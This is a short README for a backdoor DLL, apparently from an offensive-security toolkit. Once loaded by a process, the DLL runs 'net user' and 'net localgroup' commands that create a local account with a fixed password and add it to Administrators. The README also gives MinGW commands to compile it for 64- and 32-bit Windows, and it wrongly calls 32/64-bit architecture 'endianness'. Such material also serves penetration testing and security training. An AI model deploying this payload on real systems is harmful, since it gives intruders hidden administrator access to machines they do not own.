# Backdoor Admin User DLL

The `cpp` file stored inside this directory contains the source code of a DLL (Dynamic Link Library) that, once loaded by a process, executes the following system commands:

```ps1
cmd.exe /c net user rbct "P@ssw0rd!" /add
cmd.exe /c net localgroup Administrators rbct /add
```

The first command adds a local user named `rbct`, with the password `P@ssw0rd!`, while the second one adds this user to the local group `Administrators`, thus creating a **Local Administrator**.

The DLL can be used on Windows systems of arbitrary endianness, i.e. it can run on 64-bit and 32-bit systems, depending on the parameters passed to the compiler.

If you want to compile the source code on Windows, you can use *Visual Studio*.

Alternatively, you can run the following commands from a *Kali Linux* host:

```bash
# 64-bit Windows systems
x86_64-w64-mingw32-gcc -shared -o admin_user.dll admin_user.cpp

# 32-bit Windows systems
i686-w64-mingw32-gcc -shared -o admin_user.dll admin_user.cpp
```
